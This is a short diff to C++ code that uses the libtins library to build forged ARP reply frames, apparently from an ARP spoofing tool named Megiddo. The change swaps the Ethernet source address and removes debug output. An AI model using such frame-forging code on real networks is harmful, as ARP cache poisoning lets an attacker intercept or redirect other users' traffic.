@@ -28,10 +28,7 @@ namespace Megiddo{
 
             }
             void buildFrame(){
-                std::cout << iface.name() << '\n'
-                          << std::endl;
-                Tins::NetworkInterface::Info info = this->iface.addresses();
-                this->frame = Tins::EthernetII(this->hw_victim, this->my_hw);
+                this->frame = Tins::EthernetII(this->hw_victim, this->hw_target);
                 Tins::ARP arpHeader = Tins::ARP(this->ip_victim, this->ip_target, this->hw_victim, this->hw_target);
                 arpHeader.opcode(Tins::ARP::Flags::REPLY);
                 this->frame /= arpHeader;
